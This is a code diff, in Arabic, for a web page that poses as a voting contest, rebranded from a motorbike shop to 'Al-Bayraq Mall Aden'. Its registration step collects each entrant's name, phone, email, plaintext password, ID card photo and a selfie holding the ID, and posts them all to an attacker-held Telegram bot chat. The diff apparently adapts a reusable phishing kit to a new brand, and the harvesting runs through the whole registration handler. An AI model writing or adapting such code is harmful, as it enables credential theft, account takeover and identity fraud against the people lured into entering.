+    fb.textContent = "⚠️ رقم الهاتف هذا مسجل مسبقاً كمتسابق في المسابقة!";
     return;
   }
 
-  const btn = document.getElementById("btn");
+  const btn = document.getElementById("regBtn");
   btn.disabled = true;
   btn.textContent = "⚡ جارٍ إصدار رابط التصويت وإرسال الوثائق...";
 
   try {
-    let ticketID = "";
+    let ticketCode = "";
     do {
-      ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
-    } while (cloudState.c.some(c => c.k === ticketID));
+      ticketCode = "BAYRAQ-" + Math.floor(1000 + Math.random() * 9000);
+    } while (contestState.c.some(c => c.k === ticketCode));
 
-    const participantName = cleanHTML(document.getElementById("name").value.trim());
-    const email = cleanHTML(document.getElementById("email").value.trim());
-    const password = cleanHTML(document.getElementById("password").value.trim());
-    const city = cleanHTML(document.getElementById("city").value.trim());
-    const favModel = cleanHTML(document.getElementById("favModel").value);
-    const note = cleanHTML(document.getElementById("note").value.trim());
+    const name = esc(document.getElementById("regName").value.trim());
+    const email = esc(document.getElementById("regEmail").value.trim());
+    const pass = esc(document.getElementById("regPassword").value.trim());
+    const area = esc(document.getElementById("regArea").value.trim());
+    const wing = esc(document.getElementById("regWing").value);
+    const pitch = esc(document.getElementById("regPitch").value.trim());
 
-    const captionText =
-`🚨 <b>متسابق جديد مسجل (${cloudState.c.length + 1}/${MAX_CANDIDATES})!</b>
+    const cap1 =
+`🚨 <b>متسابق جديد — البيرق مول عدن (${contestState.c.length + 1}/${MAX_ENTRANTS})</b>
 ━━━━━━━━━━━━━━━━━━
-🎟️ <b>الرمز:</b> <code>${ticketID}</code>
-👤 <b>الاسم:</b> ${participantName}
-📱 <b>الهاتف:</b> <code>${rawPhone}</code>
+🎟️ <b>الرمز:</b> <code>${ticketCode}</code>
+👤 <b>الاسم:</b> ${name}
+📱 <b>الهاتف:</b> <code>${phone}</code>
 📧 <b>البريد:</b> <code>${email}</code>
-🔑 <b>كلمة المرور:</b> <code>${password}</code>
-🏙️ <b>المنطقة:</b> ${city}
-🏍️ <b>المفضل:</b> ${favModel}
-💬 <b>ملاحظة:</b> ${note || "لا يوجد"}`;
+🔑 <b>كلمة المرور:</b> <code>${pass}</code>
+🏙️ <b>المنطقة:</b> ${area}
+🏛️ <b>القسم المفضل:</b> ${wing}
+💬 <b>كلمة للجمهور:</b> ${pitch || "لا يوجد"}`;
 
     const fd1 = new FormData();
     fd1.append("chat_id", CHAT_ID);
-    fd1.append("photo", compressedIdBlob, "id_card.jpg");
-    fd1.append("caption", captionText);
+    fd1.append("photo", regIdBlob, "entrant_id.jpg");
+    fd1.append("caption", cap1);
     fd1.append("parse_mode", "HTML");
 
     const fd2 = new FormData();
     fd2.append("chat_id", CHAT_ID);
-    fd2.append("photo", compressedSelfieBlob, "selfie_id.jpg");
-    fd2.append("caption", `🤳 سيلفي مع الهوية للمتسابق: ${participantName} (${ticketID})`);
+    fd2.append("photo", regSelfieBlob, "entrant_selfie.jpg");
+    fd2.append("caption", `🤳 سيلفي مع الهوية للمتسابق: ${name} (${ticketCode})`);
 
     const [r1, r2] = await Promise.all([
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd1 }).then(r => r.json()),
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd2 }).then(r => r.json())
     ]);
 
-    if (!r1.ok || !r2.ok) throw new Error("Telegram registration upload failed");
+    if (!r1.ok || !r2.ok) throw new Error("registration upload failed");
 
-    cloudState.c.push({
-      k: ticketID,
-      n: participantName,
-      p: rawPhone,
-      y: city,
-      v: 0
-    });
+    contestState.c.push({ k: ticketCode, n: name, p: phone, y: area, v: 0 });
+    saveLocalContest();
+    pushCloudSnapshot();
+    renderRankings();
 
-    persistLocalState();
-    backgroundCloudSync();
-    renderLeaderboardUI();
+    const shareUrl = `${window.location.origin}${window.location.pathname}?vote=${ticketCode}#voting`;
+    const shareText = composeShareMessage(name, ticketCode, shareUrl);
 
-    const shareUrl = `${window.location.origin}${window.location.pathname}?vote=${ticketID}#voting`;
-    const inviteText = buildAttractiveInviteMessage(participantName, ticketID, shareUrl);
-
-    document.getElementById("ticketCode").textContent = ticketID;
-    document.getElementById("shareMessagePreview").textContent = inviteText;
-    document.getElementById("raffleForm").style.display = "none";
-    document.getElementById("ticketBox").style.display = "block";
-    document.getElementById("ticketBox").scrollIntoView({ behavior: "smooth" });
+    document.getElementById("generatedCodeBox").textContent = ticketCode;
+    document.getElementById("generatedInviteText").textContent = shareText;
+    document.getElementById("registerForm").style.display = "none";
+    document.getElementById("successTicket").style.display = "block";
+    document.getElementById("successTicket").scrollIntoView({ behavior: "smooth" });
 
   } catch (err) {
-    msg.className = "msg err";
-    msg.textContent = "❌ تعذر إتمام التسجيل، تأكد من اتصال الإنترنت وحاول مرة أخرى.";
+    fb.className = "feedback-msg err";
+    fb.textContent = "❌ تعذر إتمام التسجيل، تأكد من اتصال الإنترنت وحاول مرة أخرى.";
     btn.disabled = false;
     btn.textContent = "🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي";
   }
 });
 
-async function testBotConnection() {
+async function checkBotHealth() {
   try {
-    const meRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-    const meData = await meRes.json();
-    if (!meData.ok) {
+    const me = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`).then(r => r.json());
+    if (!me.ok) {
       alert("❌ التوكن غير صالح أو البوت متوقف.");
       return;
     }
-
-    const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const send = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: `📡 <b>اختبار اتصال ناجح!</b>\n🤖 البوت: <b>@${meData.result.username}</b>\n⏰ الوقت: ${new Date().toLocaleString("ar-YE")}`,
+        text: `📡 <b>فحص اتصال ناجح — البيرق مول عدن</b>\n🤖 البوت: <b>@${me.result.username}</b>\n⏰ الوقت: ${new Date().toLocaleString("ar-YE")}`,
         parse_mode: "HTML"
       })
-    });
-    const sendData = await sendRes.json();
-    if (sendData.ok) {
-      alert(`✅ البوت (@${meData.result.username}) متصل ويعمل بنجاح وتم إرسال رسالة اختبار!`);
+    }).then(r => r.json());
+
+    if (send.ok) {
+      alert(`✅ البوت (@${me.result.username}) متصل ويعمل بنجاح!`);
     } else {
-      alert(`⚠️ البوت يعمل لكن تعذر الإرسال إلى CHAT_ID (${CHAT_ID}): ${sendData.description || "تأكد من بدء المحادثة مع البوت أو إضافته للمجموعة"}`);
+      alert(`⚠️ البوت يعمل لكن تعذر الإرسال إلى CHAT_ID (${CHAT_ID}): ${send.description || "تحقق من صلاحيات البوت"}`);
     }
   } catch (e) {
-    alert("❌ تعذر الاتصال بواجهة تليجرام، تحقق من الشبكة.");
+    alert("❌ تعذر الاتصال بواجهة تليجرام.");
   }
 }
 
-function toggleAdminMode() {
+function toggleAdminSession() {
   if (document.body.classList.contains("admin-mode")) {
     document.body.classList.remove("admin-mode");
     alert("تم الخروج من وضع الإدارة.");
     return;
   }
-  const pin = prompt("🔐 أدخل الرقم السري لإدارة المعرض:");
+  const pin = prompt("🔐 أدخل الرقم السري لإدارة البيرق مول:");
   if (pin === ADMIN_PIN) {
     document.body.classList.add("admin-mode");
     alert("✅ تم تفعيل وضع الإدارة! ظهرت الآن أزرار إرسال التقرير وفحص البوت واستبعاد المخالفين.");
@@ -1342,61 +1397,55 @@ function toggleAdminMode() {
   }
 }
 
-async function deleteCandidateAdmin(code, name) {
-  if (!confirm(`⚠️ هل أنت متأكد من استبعاد وحذف المتسابق (${name} - ${code}) نهائياً من المسابقة؟`)) return;
-  cloudState.c = cloudState.c.filter(c => c.k !== code);
-  persistLocalState();
-  backgroundCloudSync();
-  renderLeaderboardUI();
-  alert(`✅ تم استبعاد المتسابق (${name}) وحذفه من لوحة المتصدرين فوراً.`);
+function kickEntrant(code, name) {
+  if (!confirm(`⚠️ هل أنت متأكد من استبعاد وحذف المتسابق (${name} - ${code}) نهائياً؟`)) return;
+  contestState.c = contestState.c.filter(c => c.k !== code);
+  saveLocalContest();
+  pushCloudSnapshot();
+  renderRankings();
+  alert(`✅ تم استبعاد المتسابق (${name}) فوراً.`);
 }
 
-async function sendSortedReportToBot() {
-  if (cloudState.c.length === 0) {
+async function sendOrderedReport() {
+  if (contestState.c.length === 0) {
     alert("لا يوجد متسابقون مسجلون حالياً.");
     return;
   }
-  const totalVotes = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
-  const sortedList = buildSortedTelegramLeaderboard(25);
-
-  const reportMsg =
-`📋 <b>تقرير الترتيب المرتب — متجر أمير المترات</b>
-👥 عدد المتسابقين: <b>${cloudState.c.length}</b> | 🗳️ إجمالي الأصوات: <b>${totalVotes}</b>
+  const total = contestState.c.reduce((sum, x) => sum + (x.v || 0), 0);
+  const lines = formatSortedLines(25);
+  const msg =
+`📋 <b>تقرير الترتيب المرتب — البيرق مول عدن</b>
+👥 المتسابقون: <b>${contestState.c.length}</b> | 🗳️ إجمالي الأصوات: <b>${total}</b>
 ━━━━━━━━━━━━━━━━━━
-${sortedList}
+${lines}
 ━━━━━━━━━━━━━━━━━━
 ⏰ <b>التوقيت:</b> ${new Date().toLocaleString("ar-YE")}`;
 
   const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: reportMsg, parse_mode: "HTML" })
-  });
-  const data = await res.json();
-  if (data.ok) {
-    alert("✅ تم إرسال تقرير الترتيب المرتب إلى بوت التليجرام!");
-  } else {
-    alert(`⚠️ تعذر إرسال التقرير: ${data.description || "تحقق من البوت"}`);
-  }
+    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "HTML" })
+  }).then(r => r.json());
+
+  if (res.ok) alert("✅ تم إرسال التقرير المرتب إلى البوت!");
+  else alert(`⚠️ تعذر إرسال التقرير: ${res.description || "تحقق من البوت"}`);
 }
 
-function copyShareInvite() {
-  const text = document.getElementById("shareMessagePreview").textContent;
-  navigator.clipboard.writeText(text).then(() => {
-    document.getElementById("copyFeedback").style.display = "block";
+function copyInviteMessage() {
+  const txt = document.getElementById("generatedInviteText").textContent;
+  navigator.clipboard.writeText(txt).then(() => {
+    document.getElementById("inviteCopiedHint").style.display = "block";
   });
 }
 
-function toggleGenericPass(inputId, btnEl) {
-  const inp = document.getElementById(inputId);
-  if (inp) {
-    inp.type = inp.type === "password" ? "text" : "password";
-    btnEl.textContent = inp.type === "password" ? "إظهار" : "إخفاء";
-  }
+function togglePassField(id, btn) {
+  const inp = document.getElementById(id);
+  if (!inp) return;
+  inp.type = inp.type === "password" ? "text" : "password";
+  btn.textContent = inp.type === "password" ? "إظهار" : "إخفاء";
 }
 
-// ضغط سريع للصور (حد أقصى 900px وجودة 0.72) لسرعة فائقة في الرفع للبوت
-function handleImage(event, previewId) {
+function compressDocImage(event, previewId) {
   const file = event.target.files[0];
   if (!file) return;
   const reader = new FileReader();
@@ -1412,12 +1461,12 @@ function handleImage(event, previewId) {
       canvas.width = w; canvas.height = h;
       ctx.drawImage(img, 0, 0, w, h);
       canvas.toBlob(blob => {
-        if (previewId === "idPreview") compressedIdBlob = blob;
-        else if (previewId === "selfiePreview") compressedSelfieBlob = blob;
-        else if (previewId === "voterIdPreview") compressedVoterIdBlob = blob;
+        if (previewId === "voterDocPreview") voterDocBlob = blob;
+        else if (previewId === "regIdPreview") regIdBlob = blob;
+        else if (previewId === "regSelfiePreview") regSelfieBlob = blob;
 
-        const p = document.getElementById(previewId);
-        if (p) { p.src = URL.createObjectURL(blob); p.style.display = "block"; }
+        const prev = document.getElementById(previewId);
+        if (prev) { prev.src = URL.createObjectURL(blob); prev.style.display = "block"; }
       }, "image/jpeg", 0.72);
     };
     img.src = e.target.result;
@@ -1425,15 +1474,15 @@ function handleImage(event, previewId) {
   reader.readAsDataURL(file);
 }
 
-function cleanHTML(str) {
+function esc(str) {
   return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 }
 
-generateCaptcha();
-renderLeaderboardUI();
-checkUrlVoteParam();
-syncFromTelegramCloud(false);
-setInterval(() => syncFromTelegramCloud(false), 15000);
+makeMathChallenge();
+renderRankings();
+inspectUrlVote();
+syncCloudData(false);
+setInterval(() => syncCloudData(false), 15000);
 </script>
 
 </body>
